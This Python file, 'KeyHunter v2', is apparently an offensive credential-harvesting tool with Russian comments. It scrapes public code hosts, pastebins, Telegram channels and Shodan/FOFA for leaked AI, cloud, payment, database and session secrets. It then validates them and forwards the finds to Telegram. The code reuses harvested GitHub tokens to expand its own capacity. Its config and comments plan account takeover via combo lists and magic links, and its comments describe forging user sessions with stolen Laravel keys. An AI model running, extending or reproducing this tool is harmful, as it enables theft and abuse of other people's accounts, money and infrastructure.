#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KeyHunter v2 — постоянный монитор API-ключей (opus / glm / gpt-5.6-sol ...).

Пайплайн: SOURCES (параллельно) -> EXTRACTOR (regex + base-url контекст)
          -> DEDUP -> VALIDATOR (models/balance/embed/rerank/chat) -> REPORT (TG/консоль).

Источники v2:
  github-gists      публичные гисты (без токена)
  grep.app          GitHub код-поиск без токена + полные файлы raw
  github-code       GitHub code search (нужен PAT)         [x10 объём]
  github-issues     GitHub issues search (нужен PAT)       — .env/ключи в issue-боди
  gitee             Gitee веб-код-поиск (китайские утёчки) + raw-файлы
  gitlab            GitLab public snippets (api v4)
  sourcegraph       Sourcegraph stream-поиск по всем форджам
  hf-spaces         HuggingFace Spaces (app.py/.env с хардкод-ключами new-api/one-api)
  pastebin          /archive + raw (2026-разметка)
  se-ddg            DuckDuckGo HTML: site:rentry.co / telegra.ph / justpaste ...
  se-searxng        SearxNG JSON-инстансы (резервный движок)
  linux.do          через cloudscraper (CF-bypass)
  v2ex              v2ex hot topics
  shodan            (ключ) http.html:"sk-..." наружу
  fofa              (email+key) китайский аналог Shodan
  feeds             кастомные URL: html/json/text — в т.ч. https://t.me/s/<канал> !
  tg_channels       список тг-каналов -> t.me/s/<канал> (авто в feeds)
  local             scan-file / scan-dir

Команды:
  once                     один проход
  monitor|loop [--every N] постоянный монитор (дефолт 900с) + постинг в TG
  scan-file <path>         локальный файл (выгрузка и т.п.)
  scan-dir <dir>           локальная папка
  validate --base --key    ручная проверка
  recheck                  ревалидация найденного (жив/мёртв)
  sources                  статус источников
"""

import argparse
import concurrent.futures
import datetime
import email as email_lib
import hashlib
import html as htmllib
import imaplib
import json
import os
import re
import sys
import threading
import time
import typing
import uuid
from email.header import decode_header
from urllib.parse import quote as urlquote, unquote, parse_qs, urlparse
import requests
from requests.adapters import HTTPAdapter
import urllib3

urllib3.disable_warnings()
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[attr-defined]
    except Exception:
        pass

HERE = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(HERE, "keyhunter.json")
STORE_PATH = os.path.join(HERE, "keyhunter_found.jsonl")
DEAD_PATH = os.path.join(HERE, "keyhunter_dead.jsonl")
SEEN_PATH = os.path.join(HERE, "keyhunter_seen.json")

DEFAULT_CONFIG = {
    # --- токены (заполни для x10-объёма) ---
    "github_token": "",
    "shodan_key": "",
    "netlas_key": "",
    "censys_key": "",
    "fofa_email": "",
    "fofa_key": "",
    "sourcegraph_token": "",
    # --- автопостинг находок в Telegram ---
    "tg_token": "",
    "tg_chat": "",
    # --- телеграм-каналы с ключами (публичные): ["AI_KEYS_HUNT", ...] ---
    "tg_channels": [],
    # --- кастомные фиды: ["https://t.me/s/some_channel", "https://site/feed"] ---
    "feeds": [],
    # --- объёмы ---
    "max_gists": 100,
    "max_pastebins": 80,
    "se_max_pages": 6,
    "loop_every": 900,
    # --- запросы поисковиков (заточены под opus/glm/gpt-sol утёчки) ---
    "se_queries": [
        '"sk-ant-api03"',
        '"claude-opus-4-8" "sk-"',
        '"claude-opus-5" "apiKey"',
        '"gpt-5.6-sol" "sk-"',
        '"glm-5.3" "sk-"',
        '"glm-5.2" api key leak',
        '"api.siliconflow.cn" "sk-"',
        '"dashscope" "sk-" "api_key"',
        '"new-api" "sk-" "opus"',
        '"one-api" "sk-ant"',
        '"kimi-k3" "sk-" moonshot',
        '"gpt-5.5" "sk-" free',
        'site:rentry.co "sk-"',
        'site:telegra.ph "sk-"',
        'site:justpaste.it "sk-ant"',
        'site:linux.do "sk-"',
        'site:dev.to "api key" claude',
        'site:greasyfork.org "api_key"',
        'site:controlc.com "sk-"',
        'site:pastebin.com "sk-ant"',
        'site:github.com "sk-ant-api03" ".env"',
        'site:gist.github.com "sk-ant-api03"',
    ],
    "grep_queries": [
        "api.deepseek.com sk-",
        "modelscope ms-",
        "dashscope sk-",
        "sk-ant-api03",
        "api.siliconflow.cn",
        "OPENAI_API_BASE sk-",
        "bigmodel.cn api-key",
        "moonshot api key",
        "llm proxy sk-",
        "gpt-5.6-sol sk-",
        "glm-5.3 sk-",
        # 🚀 GLM/Kimi провайдер-волна (2026-09-10): env-присвоения с литералами
        "ZHIPU_API_KEY=",
        "MOONSHOT_API_KEY=",
        "open.bigmodel.cn",
        "api.moonshot.cn",
        "api.z.ai",
        "BASETEN_API_KEY=",
        "inference.baseten.co",
        "DEEPINFRA_API_KEY=",
        "NOVITA_API_KEY=",
        "CEREBRAS_API_KEY=",
        "SAMBANOVA_API_KEY=",
        "CHUTES_API_KEY=",
        "HYPERBOLIC_API_KEY=",
        "SUPABASE_SERVICE_ROLE_KEY=",
        "AZURE_OPENAI_API_KEY=",
        "WorkosCursorSessionToken=",
        "sk-proj-",
        "kimi-k3 api_key",
    ],
    "shodan_queries": [
        'http.html:"sk-ant-api03"',
        'http.html:"sk-proj-"',
        'http.html:"OPENAI_API_KEY"',
        'http.html:"sk-ant"',
    ],
    "fofa_queries": [
        'body="sk-ant-api03"',
        'body="sk-proj-"',
        'body="OPENAI_API_KEY"',
        'body="sk-ant"',
    ],
    "searx_instances": [
        "https://searx.be",
        "https://search.inetol.net",
        "https://searx.tiekoetter.com",
    ],
    "zoomeye_key": "",
    "criminalip_key": "",
    # --- P2-краулеры: без ключа — молча skip ---
    "greynoise_key": "",
    "quake_key": "",
    "hunter_key": "",
    # --- email-cred охота (комболисты -> почта -> magic-link ATO) ---
    "email_combo_per_cycle": 30,
    "ato_auto": False,
    "hf_terms": ["new-api", "one-api", "openai-proxy", "claude", "chatgpt"],
    # --- живущие только в keyhunter.json (реген из дефолтов их не убьёт) ---
    "github_tokens_pool": [],
    "disabled_sources": [],
    "relay_boards": [],
    "vault_repo": "Ins2lt/night-vault",
    "validate_budget": 1500,
    "source_timeout": 1200,
    "shodan_budget": 1080,
    "shodan_page_mult": 2,
    "urlscan_key": "",
    "kaggle_token": "",
    "leakix_key": "",
    "virustotal_key": "",
    "censys_id": "",
    "censys_secret": "",
}

LOCK = threading.RLock()

_GH_POOL_ROT = {"i": 0, "seeded": False}


def gh_token():
    """GitHub-токен с РОТАЦИЕЙ по пулу (найденные живые токены = +5000 запр/час каждый).
    Пул: github_tokens_pool в конфиге + АВТОСИДИНГ живых github-ключей из стора.
    Fallback: github_token."""
    pool = [t for t in (CFG.get("github_tokens_pool") or []) if t]
    # primary github_token — ВСЕГДА первым в пуле (было: если пул непуст,
    # primary никогда не использовался, если не дублировался в пуле)
    _primary = CFG.get("github_token") or ""
    if _primary and _primary not in pool:
        pool.insert(0, _primary)
    if not _GH_POOL_ROT["seeded"]:
        with LOCK:  # double-checked: пока один тред сеет, другие ждут
            if not _GH_POOL_ROT["seeded"]:
                _GH_POOL_ROT["seeded"] = True
                _n0 = len(pool)
                try:
                    with open(STORE_PATH, encoding="utf-8") as f:
                        for line in f:
                            try:
                                v = json.loads(line)
                            except Exception:
                                continue
                            if (
                                v.get("tag") == "github"
                                and v.get("status") == "working"
                            ):
                                k = v.get("key") or ""
                                if k and k not in pool:
                                    pool.append(k)
                                    # 🔧 P0: персистим в конфиг — раньше
                                    # сид-токены жили только в локальной
                                    # переменной и терялись после вызова
                                    cfg_pool = CFG.setdefault("github_tokens_pool", [])
                                    if k not in cfg_pool:
                                        cfg_pool.append(k)
                except Exception:
                    pass
                if len(pool) > _n0:
                    log(
                        "  [gh-pool] автосидинг из стора: %d токенов (+%d)"
                        % (len(pool), len(pool) - _n0)
                    )
                _GH_POOL_ROT["pool_size_at_seed"] = len(pool)
    if not pool:
        return CFG.get("github_token", "")
    with LOCK:  # потокобезопасная ротация (4 параллельных воркера запросов)
        i = _GH_POOL_ROT["i"] % len(pool)
        _GH_POOL_ROT["i"] += 1
    return pool[i]


LOG_LOCK = threading.RLock()

PROXY = requests.Session()  # локальный прокси (xray/nekoray)
# ЯВНЫЙ прокси: env-переменных в системе НЕТ, а api.telegram.org на этом
# канале заблокирован — без явного прокси весь TG-постинг молча таймаутил
# (диагноз 2026-09-08: локальные находки не доходили до чата, GH-бот постил
# нормально). На GH-раннере 127.0.0.1:10809 = instant refuse -> DIRECT.
_p = os.environ.get("KH_PROXY", "http://127.0.0.1:10809")
PROXY.proxies = {"http": _p, "https": _p}
DIRECT = requests.Session()
DIRECT.trust_env = False
# Пулы соединений: валидация гонит десятки параллельных проб через ОДНУ
# сессию (фаза 1 тэглесс-ключа — до 40 бордов сразу). Дефолтный
# pool_maxsize=10 сериализует их в ~10 конкурентных + пересоздаёт TCP/TLS на
# остальных (churn, особенно дорого через прокси). Поднимаем пул — реальный
# параллелизм вместо потолка ~10×.
for _sess in (PROXY, DIRECT):
    for _scheme in ("https://", "http://"):
        _sess.mount(
            _scheme, HTTPAdapter(pool_connections=64, pool_maxsize=64, max_retries=0)
        )
TRANSPORT = {}
UA = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Accept": "text/html,application/json;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8",
}


LOG_PATH = os.path.join(HERE, "kh_monitor.log")
_LOG_FH: typing.Any = None


def _log_file():
    """UTF-8 файловый лог: независим от кодировки консоли/редиректа (P0.6)."""
    global _LOG_FH
    if _LOG_FH is None:
        try:
            _LOG_FH = open(LOG_PATH, "a", encoding="utf-8", buffering=1)
        except Exception:
            _LOG_FH = False
    return _LOG_FH or None


def log(msg):
    with LOG_LOCK:
        try:
            print(msg, flush=True)
        except Exception:
            pass  # консоль CP1251 не должна ронять пайплайн на юникоде
        try:
            fh = _log_file()
            if fh:
                fh.write(str(msg) + "\n")
        except Exception:
            pass


def load_config():
    cfg = dict(DEFAULT_CONFIG)
    if os.path.exists(CONFIG_PATH):
        try:
            cfg.update(json.load(open(CONFIG_PATH, encoding="utf-8")))
        except Exception as e:
            log("config parse err: %s (defaults)" % e)
    if not os.path.exists(CONFIG_PATH):
        json.dump(
            cfg, open(CONFIG_PATH, "w", encoding="utf-8"), ensure_ascii=False, indent=2
        )
    return cfg


CFG = load_config()


# файл пула Shodan-ключей: env > E:\Tg (основной edu-пул) > файл рядом со скриптом.
# Раньше дефолт указывал ТОЛЬКО на <scriptdir>\shodan-keys.json (которого нет) —
# edu-пул 198k кредитов молча не грузился.
def _resolve_shodan_keys_file():
    cands = [
        os.environ.get("SHODAN_KEYS_FILE") or "",
        r"E:\Tg\shodan-keys.json",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "shodan-keys.json"),
    ]
    for c in cands:
        if c and os.path.exists(c):
            return c
    return cands[-1]


SHODAN_KEYS_FILE = _resolve_shodan_keys_file()


# ------------------------------------------------------------------ HTTP
def http(
    method, url, timeout=(8, 20), stream=False, headers=None, json_body=None, data=None
):
    host = urlparse(url).hostname or url
    h = dict(UA)
    if headers:
        h.update(headers)
    if TRANSPORT.get(host) == "direct":
        order = [(DIRECT, "direct"), (PROXY, "proxy")]
    else:
        order = [(PROXY, "proxy"), (DIRECT, "direct")]
    last = None
    for sess, name in order:
        try:
            r = sess.request(
                method,
                url,
                headers=h,
                timeout=timeout,
                verify=False,
                stream=stream,
                json=json_body,
                data=data,
            )
            # 451/502/503 = гео/CF-блок через этот транспорт — пробуем другой
            # (403 НЕ трогаем: для API это легитный ответ про ключ)
            if r.status_code in (451, 502, 503) and name == order[0][1]:
                last = RuntimeError("block-page %d via %s" % (r.status_code, name))
                continue
            # пин транспорта только на осмысленном ответе (было: пин на ЛЮБОМ,
            # включая CF-челлендж — хост навсегда залипал на плохом канале)
            if r.status_code < 400 and TRANSPORT.get(host) != name:
                TRANSPORT[host] = name
            return r
        except Exception as e:
            last = e
            continue
    raise last if last else RuntimeError("no session")


def fetch_text(url, timeout=(8, 20), max_bytes=700_000, headers=None):
    r = http("GET", url, timeout=timeout, headers=headers, stream=True)
    with r:
        if r.status_code != 200:
            return None, r.status_code
        chunks, total = [], 0
        for c in r.iter_content(chunk_size=65536):
            if not c:
                continue
            chunks.append(c)
            total += len(c)
            if total >= max_bytes:
                break
    return b"".join(chunks).decode("utf-8", "replace"), 200


def cloud_get(url, timeout=(15, 30)):
    """cloudscraper: сначала через ЯВНЫЙ прокси (10809), потом direct.
    (было: trust_env=True/False без явного proxies — обе попытки фактически
    DIRECT, CF-заблокированные источники прокси никогда не видели)."""
    try:
        import cloudscraper

        for use_proxy in (True, False):
            try:
                s = cloudscraper.create_scraper(
                    browser={
                        "browser": "chrome",
                        "platform": "windows",
                        "desktop": True,
                    }
                )
                s.trust_env = False
                if use_proxy:
                    s.proxies = dict(PROXY.proxies)
                r = s.get(url, timeout=timeout, verify=False)
                # CF-челлендж через прокси -> пробуем direct
                if r.status_code in (403, 503) and use_proxy:
                    continue
                return r
            except Exception:
                continue
    except Exception:
        pass
    return None


def cloudscraper_ok():
    try:
        import cloudscraper  # noqa: F401

        return True
    except Exception:
        return False


def _cloud_get_hdrs(url, headers, timeout=(15, 30)):
    """cloudscraper GET с кастомными заголовками (Cookie и т.п.).
    Попытка 1 через явный прокси, попытка 2 direct."""
    try:
        import cloudscraper

        for use_proxy in (True, False):
            try:
                s = cloudscraper.create_scraper(
                    browser={
                        "browser": "chrome",
                        "platform": "windows",
                        "desktop": True,
                    }
                )
                s.trust_env = False
                if use_proxy:
                    s.proxies = dict(PROXY.proxies)
                return s.get(url, headers=headers, timeout=timeout, verify=False)
            except Exception:
                continue
    except Exception:
        pass
    return None


# ------------------------------------------------------------------ EXTRACTOR
# (tag, regex, candidate_bases, context_required)
KEY_PATTERNS = [
    (
        "anthropic",
        r"sk-ant-api03-[A-Za-z0-9_\-]{20,}",
        ["https://api.anthropic.com"],
        False,
    ),
    # Claude OAuth токены (Max/Pro подписки) — Bearer-аутентификация
    (
        "anthropic",
        r"sk-ant-oat01-[A-Za-z0-9_\-]{20,}",
        ["https://api.anthropic.com"],
        False,
    ),
    # REFRESH-токены: минтят перманентный доступ к тиру аккаунта (святыня!)
    (
        "anthropic-refresh",
        r"sk-ant-ort01-[A-Za-z0-9_\-]{20,}",
        [],
        False,
    ),
    # Web-сессии claude.ai (вкл. КОРПОРАТИВНЫЕ аккаунты!)
    # sid02 — новый формат сессий (ATO-минт даёт именно его)
    (
        "anthropic-web",
        r"sk-ant-sid0[12]-[A-Za-z0-9_\-]{20,}",
        [],
        False,
    ),
    # ChatGPT web-сессии: cookie __Secure-next-auth.session-token (JWE JWT)
    # — полные аккаунты с Plus/Pro/Team из cookies.txt-дампов
    (
        "openai-web",
        r"eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4R0NtIn0[A-Za-z0-9_.\-]{100,}",
        [],
        False,
    ),
    # AWS: access key + секрет рядом (env/config пара; зазор покрывает
    # "aws_secret_access_key = " между ними)
    (
        "aws",
        # АУДИТ-фикс: +",;" в зазор — JSON/CSV-пары "AKIA...","secret..."
        r"AKIA[0-9A-Z]{16}[\s\"':=,;a-zA-Z_]{1,50}[A-Za-z0-9/+=]{40}",
        [],
        False,
    ),
    # Slack токены всех типов (аудит-фикс: был только xoxb-):
    # b=bot, p=user, s=session, a=app-level — auth.test валидирует любой
    (
        "slack",
        r"xox[bpoas]-[0-9]{10,13}-[0-9]{10,13}(?:-[0-9]{10,13})?-[A-Za-z0-9]{20,40}",
        [],
        False,
    ),
    # Google OAuth refresh-токены УБРАНЫ (2026-09-09): голый refresh_token без
    # client_id/client_secret невалидируем (валидатора нет и не будет) —
    # кандидаты висели вечными unverified и жгли бюджет. 0 находок за всё время.
    # ADMIN-ключи Anthropic (org-уровень, корпоративная консоль)
    (
        "anthropic-admin",
        r"sk-ant-admin01-[A-Za-z0-9_\-]{20,}",
        [],
        False,
    ),
    # Agent-токены Anthropic (sk-ant-at01) — валидация как у anthropic
    (
        "anthropic",
        r"sk-ant-at01-[A-Za-z0-9_\-]{20,}",
        ["https://api.anthropic.com"],
        False,
    ),
    # GitHub токены (Copilot-подписка + +ёмкость code search!)
    (
        "github",
        r"gh[posur]_[A-Za-z0-9]{36,}",
        [],
        False,
    ),
    # GitHub fine-grained PAT (github_pat_...)
    (
        "github",
        r"github_pat_[A-Za-z0-9_]{22,}",
        [],
        False,
    ),
    # GitLab PAT (код-поиск + доступ к приватным репо с ключами)
    (
        "gitlab",
        r"glpat-[A-Za-z0-9_\-]{20,}",
        [],
        False,
    ),
    # NVIDIA NIM (build.nvidia.com)
    (
        "nvidia",
        r"nvapi-[A-Za-z0-9_\-]{20,}",
        ["https://integrate.api.nvidia.com/v1"],
        False,
    ),
    # Cerebras
    (
        "cerebras",
        r"csk-[a-f0-9]{40,}",
        ["https://api.cerebras.ai/v1"],
        False,
    ),
    # Vercel AI Gateway
    (
        "vercel",
        r"vck_[A-Za-z0-9]{20,}",
        ["https://ai-gateway.vercel.sh/v1"],
        False,
    ),
    # Zhipu bigmodel legacy-формат id.secret (с точкой!) — только с контекстом
    (
        "sklong",
        r"[0-9a-f]{32}\.[A-Za-z0-9]{16,}",
        ["https://open.bigmodel.cn/api/paas/v4"],
        True,
    ),
    # Perplexity (Pro подписки)
    (
        "perplexity",
        r"pplx-[A-Za-z0-9]{30,}",
        ["https://api.perplexity.ai"],
        False,
    ),
    # Fireworks AI
    (
        "fireworks",
        r"fw_[A-Za-z0-9]{20,}",
        ["https://api.fireworks.ai/inference/v1"],
        False,
    ),
    ("openai", r"sk-proj-[A-Za-z0-9_\-]{30,}", ["https://api.openai.com/v1"], False),
    # MiniMax (CN релей; формат из референс-архива: sk-api-...{119})
    (
        "minimax",
        r"sk-api-[A-Za-z0-9_\-]{80,}",
        [
            "https://api.minimax.chat/v1",
            "https://api.minimaxi.com/v1",
        ],
        False,
    ),
    # ElevenLabs TTS (sk_ + hex; из референса: sk_[0-9a-f]{48})
    (
        "elevenlabs",
        r"sk_[0-9a-f]{40,48}\b",
        ["https://api.elevenlabs.io/v1"],
        False,
    ),
    (
        "openrouter",
        r"sk-or-[A-Za-z0-9\-]{30,}",
        ["https://openrouter.ai/api/v1"],
        False,
    ),
    (
        "modelscope",
        r"ms-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        [
            "https://api-inference.modelscope.cn/v1",
            "https://api-inference.modelscope.ai/v1",
        ],
        False,
    ),
    # Zhipu GLM официал (bigmodel.cn / z.ai): формат {32hex}.{secret} —
    # БЕЗ этого паттерна glm-ключи вообще не извлекались из дампов!
    (
        "zhipu",
        r"(?<![A-Za-z0-9])[0-9a-f]{32}\.[A-Za-z0-9_\-]{10,40}(?![A-Za-z0-9_\-])",
        [
            "https://open.bigmodel.cn/api/paas/v4",
            "https://api.z.ai/api/paas/v4",
        ],
        False,
    ),
    # ==== OSINT-ВОЛНА 2026-09-10 (Claude-OSINT §17 каталог, 80 паттернов) ====
    # секретс-менеджеры = ВСЕ секреты орга разом:
    ("doppler", r"dp\.pt\.[A-Za-z0-9]{40,44}", [], False),  # Doppler token
    # open-ended: кап {90,100} резал длинные токены (boundary-check на срезе)
    ("vault", r"hvs\.[A-Za-z0-9_\-]{90,}", [], False),  # HashiCorp Vault
    ("terraform", r"[A-Za-z0-9]{14}\.atlasv1\.[A-Za-z0-9_\-=]{60,70}", [], False),
    # облака/инфра:
    ("digitalocean", r"dop_v1_[a-f0-9]{64}", [], False),
    ("dockerhub", r"dckr_pat_[A-Za-z0-9_\-]{27,}", [], False),
    ("jfrog", r"AKCp[A-Za-z0-9]{50,70}", [], False),
    ("ngrok", r"\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b", [], False),
    # платёжка/коммерция:
    ("square", r"sq0atp-[0-9A-Za-z\-_]{22}", [], False),
    ("square-secret", r"sq0csp-[0-9A-Za-z\-_]{43}", [], False),
    # dev-инструменты с чужими ключами внутри:
    ("postman", r"PMAK-[A-Za-z0-9]{24,64}", [], False),  # Postman = коллекции
    ("databricks", r"dapi[0-9a-f]{32}(?:-\d)?", [], False),
    ("dropbox", r"sl\.[A-Za-z0-9_\-]{100,}", [], False),  # open-ended: {130,140} резал
    ("mailchimp", r"[0-9a-f]{32}-us[0-9]{1,2}", [], False),  # dc-суффикс в ключе
    ("rubygems", r"rubygems_[a-f0-9]{48}", [], False),
    ("grafana-cloud", r"glc_[A-Za-z0-9+/]{32,}={0,2}", [], False),
    ("atlassian", r"ATATT3xFfGF0[A-Za-z0-9_\-]{180,}", [], False),
    ("newrelic", r"(?:NRAA|NRAK|NRBR)-[A-F0-9]{27}", [], False),
    ("pypi", r"pypi-AgENdGV[A-Za-z0-9_\-]+", [], False),
    ("fcm", r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}", [], False),
    (
        "slack-webhook",
        # (?:...) — НЕзахватывающие: экстрактор берёт group(1) при наличии
        # групп — захватывающие T/B ломали бы извлечение полного URL
        r"https://hooks\.slack\.com/services/(?:T[A-Z0-9]+)/(?:B[A-Z0-9]+)/[A-Za-z0-9]+",
        [],
        False,
    ),
    # контекст-анкоред (FP-защита — матч только рядом с именем сервиса):
    ("okta", r"(?i)SSWS\s+([0-9a-zA-Z_\-]{38,})", [], False),
    (
        "heroku",
        r"(?i)heroku[^\n]{0,60}?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
        [],
        False,
    ),
    (
        "datadog",
        r"(?i)(?:datadog|dd[_\-]?api[_\-]?key)[^\n]{0,60}?([a-f0-9]{32})",
        [],
        False,
    ),
    ("mailgun", r"(?i)mailgun[^\n]{0,60}?\bkey-([0-9a-zA-Z]{32})\b", [], False),
    (
        "algolia",
        r"(?i)algolia[^\n]{0,60}?admin[^\n]{0,40}?\b([A-Za-z0-9]{32})\b",
        [],
        False,
    ),
    (
        "azure-ad",
        r"(?i)(?:azure|entra)[_\-]?(?:client|app)[_\-]?secret['\"\s:=]+([A-Za-z0-9_~.\-]{34,40})",
        [],
        False,
    ),
    # oauth-токены (короткоживущие, но мгновенный доступ):
    ("facebook", r"EAA[A-Za-z0-9]{90,}", [], False),
    ("google-oauth-token", r"ya29\.[0-9A-Za-z_\-]{20,}", [], False),
    ("groq", r"gsk_[A-Za-z0-9]{30,}", ["https://api.groq.com/openai/v1"], False),
    (
        "huggingface",
        r"hf_[A-Za-z0-9]{30,}",
        ["https://api-inference.huggingface.co"],
        False,
    ),
    ("google", r"AIza[0-9A-Za-z_\-]{35}", [], False),
    ("logfare", r"lfu_[A-Za-z0-9_\-]{15,}", ["https://logfare.ai/v1"], False),
    # voyage: pa- с ДЕФИСОМ (реальный формат). Старый pa_ ловил норвежские
    # doc-слаги ("pa_en_tabell_-_649") — 0 рабочих за всё время.
    ("voyage", r"pa-[A-Za-z0-9]{20,}", ["https://api.voyageai.com/v1"], False),
    ("xai", r"xai-[A-Za-z0-9]{30,}", ["https://api.x.ai/v1"], False),
    (
        "openai-svcacct",
        r"sk-svcacct-[A-Za-z0-9_\-]{20,}",
        ["https://api.openai.com/v1"],
        False,
    ),
    ("supabase", r"sbp_[a-f0-9]{40}", [], False),
    # Anthropic catch-all: любые sk-ant-XX-* варианты будущих форматов
    # (конкретные api03/oat01/ort01/sid01/admin01/at01 выше — выигрывают первыми)
    (
        "anthropic",
        r"sk-ant-[A-Za-z0-9]{2,4}-[A-Za-z0-9_\-]{20,}",
        ["https://api.anthropic.com"],
        False,
    ),
    # Together AI (новый формат tgp_v1_)
    (
        "together",
        r"tgp_v1_[A-Za-z0-9_\-]{20,}",
        ["https://api.together.xyz/v1"],
        False,
    ),
    # Replicate
    (
        "replicate",
        r"r8_[A-Za-z0-9]{20,}",
        ["https://api.replicate.com/v1"],
        False,
    ),
    # Jina AI (embeddings/rerank + reader)
    (
        "jina",
        r"jina_[A-Za-z0-9]{20,}",
        ["https://api.jina.ai/v1"],
        False,
    ),
    # Stripe live/restricted keys (деньги! /v1/account — read-only проверка)
    (
        "stripe",
        r"(?:sk|rk)_live_[A-Za-z0-9]{20,}",
        [],
        False,
    ),
    # Telegram bot tokens (автопостинг/управление ботами)
    (
        "tg-bot",
        r"\b\d{8,10}:[A-Za-z0-9_\-]{35}\b",
        [],
        False,
    ),
    # generic sk-: только если рядом есть base-url контекст (иначе валидация по кандидату)
    (
        "sk32",
        r"sk-[a-f0-9]{32}",
        [
            "https://api.deepseek.com",
            "https://api.deepseek.com/v1",
            "https://dashscope.aliyuncs.com/compatible-mode/v1",
        ],
        False,
    ),
    (
        "sklong",
        r"sk-[A-Za-z0-9_\-]{40,120}",
        [
            "https://api.siliconflow.cn/v1",
            "https://open.bigmodel.cn/api/paas/v4",
            "https://api.moonshot.cn/v1",
            "https://api.moonshot.ai/v1",
            "https://api.stepfun.com/v1",
        ],
        False,
    ),
    # broad generic: закрываем "мёртвую зону" len 24-63 с mixed-case и _-
    # (sk32 ловит только hex/35, sklong только 43+; ключи вида sk-DStJmupqYRHEKfM5cDdkMw пролетали)
    (
        "skgen",
        r"sk-(?!ant-|proj-|svcacct-|or-v1)[A-Za-z0-9][A-Za-z0-9_\-]{20,110}",
        [
            "https://api.deepseek.com",
            "https://dashscope.aliyuncs.com/compatible-mode/v1",
            "https://dashscope-intl.aliyuncs.com/compatible-mode/v1",
            "https://api.siliconflow.cn/v1",
            "https://api-inference.modelscope.cn/v1",
            "https://token.sensenova.cn/v1",
            "https://open.bigmodel.cn/api/paas/v4",
            "https://api.moonshot.cn/v1",
            "https://llmapi.paratera.com/v1",
            "https://api.groq.com/openai/v1",
            "https://openrouter.ai/api/v1",
        ],
        False,
    ),
    # short sk- (Vercel/T3 style, len 20-23)
    (
        "sk20",
        r"sk-[A-Za-z0-9_\-]{17,22}",
        [
            "https://api.openai.com/v1",
            "https://api.deepseek.com",
            "https://api.deepseek.com/v1",
        ],
        False,
    ),
    # Bearer tokens (часто в curl примерах и конфигах)
    (
        "bearer",
        r"Bearer\s+(sk-[A-Za-z0-9_\-]{20,}|[A-Za-z0-9\-_]{40,})",
        [],
        False,
    ),
    # hex64/hex48 УБРАНЫ (2026-09-09): 185+ unverified в сторе, 0 рабочих за
    # всё время — это git-SHA/контент-хэши рядом с URL, а не ключи. hex32
    # оставлен: по нему есть реальные no_balance/working (dashscope-стиль).
    ("hex32", r"\b[a-f0-9]{32}\b", [], True),
    # 🔑 Laravel APP_KEY: ключ шифрования сессий фреймворка — с ним форжим
    # куку ЛЮБОГО юзера приложения (session fixation без пароля)
    ("laravel-appkey", r"APP_KEY=base64:[A-Za-z0-9+/]{40,44}={0,2}", [], False),
    # 🔑 Google OAuth client secret: GOCSPX-xxx (24+). Пара с client_id (часто
    # рядом в контексте) = OAuth-поток от имени чужого приложения
    ("gocspx", r"GOCSPX-[A-Za-z0-9_\-]{24,}", [], False),
    # ☁️ инфра-токены (экспорт-разбор: cloudflare/npm/linear/figma/twilio/shopify)
    (
        "cloudflare",
        r"(?<![A-Za-z0-9_\-])[A-Za-z0-9_\-]{37,44}(?![A-Za-z0-9_\-])",
        [],
        True,
    ),  # CF токен 37-40ch + контекст
    ("npm", r"npm_[A-Za-z0-9]{36}", [], False),
    ("linear", r"lin_api_[A-Za-z0-9]{30,}", [], False),
    ("figma", r"figd_[A-Za-z0-9_\-]{30,}", [], False),
    # Twilio: SK + Account SID рядом (env-файлы: SID строкой выше) — с парой
    # живая валидация api.twilio.com/Accounts/{sid}.json
    ("twilio", r"(?:AC[0-9a-f]{32}[\s\S]{0,40}?)?SK[0-9a-f]{32}\b", [], False),
    # Shopify: токен + домен магазина рядом — с доменом валидация /admin/api
    (
        "shopify",
        r"(?:[a-z0-9][a-z0-9\-]{2,60}\.myshopify\.com[\s\S]{0,40}?)?(?:shpat|shpca|shpss)_[A-Za-z0-9]{32,}",
        [],
        False,
    ),
    ("sentry", r"sntrys_[A-Za-z0-9_\-]{30,}", [], False),
    # --- НЕОРДИНАРНАЯ ВОЛНА: DB-креды и Google-сессии из логов/экспортов ---
    # postgres://user:pass@host/db — 487 таких в TG-экспортах, валидируются логином
    (
        "db-dsn",
        # postgres(+driver)/mysql(+driver)/mongodb(+srv)/redis(s)/libsql(turso)/
        # pscale(planetscale)/amqp(rabbit). юзер может быть пустым (redis://:pw@),
        # /db — опционально (redis/amqp). pscale:// и libsql:// — managed-таргеты.
        r"(?:postgres(?:ql)?(?:\+\w+)?|mysql(?:\+\w+)?|mongodb(?:\+srv)?|rediss?|"
        r"pscale|amqps?)://"
        r"[A-Za-z0-9_%\-.]*:[^@\s\"'<>]{3,}@[A-Za-z0-9.\-]+(?::\d{2,5})?(?:/[A-Za-z0-9_%\-.]*)?",
        [],
        False,
    ),
    # turso: libsql://host?authToken=... (кред в query, не в userinfo)
    (
        "db-dsn",
        r"libsql://[A-Za-z0-9.\-]+\?authToken=[A-Za-z0-9_\-]{8,}",
        [],
        False,
    ),
    # 🎫 CODEX (ChatGPT Plus/Pro подписки): ~/.codex/auth.json — id_token и
    # access_token JWT (RS256) + account_id. Дампится из dotfiles/логов/бэкапов.
    (
        "codex",
        r"\"id_token\"\s*:\s*\"(eyJ[A-Za-z0-9_\-\.]{100,})\"",
        [],
        False,
    ),
    (
        "codex",
        r"\"access_token\"\s*:\s*\"(eyJ[A-Za-z0-9_\-\.]{100,})\"[^}]{0,400}\"account_id\"",
        [],
        False,
    ),
    # chatgpt web-сессия (next-auth) из дампов/логов = ChatGPT+Codex веб
    # (оба формата: "Cookie: name=value" и netscape-дампы "name\tvalue")
    (
        "codex-web",
        r"__Secure-next-auth\.session-token(?:=|\t)([A-Za-z0-9_\-\.]{200,})",
        [],
        False,
    ),
